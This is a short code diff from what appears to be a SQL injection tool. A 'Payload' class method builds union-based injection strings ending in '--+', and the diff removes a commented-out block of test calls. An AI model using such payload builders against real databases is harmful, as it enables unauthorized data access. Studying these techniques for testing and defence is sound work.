@@ -64,15 +64,3 @@ class Payload():
             list1 = [str(i) for i in list3]
             list2 = ','.join(list1)
             return self.pre_payload + ' and 1=2 union select '+list2+' from '+schema_name+'.'+table_name + ' --+'
-
-
-
-'''if __name__ == "__main__":
-    b = [1,'aaa',3,'bbb']
-    print(order_by(3))
-    print(order_list(b))
-    print(union_sql(None,1,'database','table',b))
-    print(union_sql(2,1,None,'table',b))
-    print(union_sql(2,1,'database',None,b))
-    print(union_sql(2,1,'database','table',[]))
-    print(union_sql(2,1,'database','table',b))'''
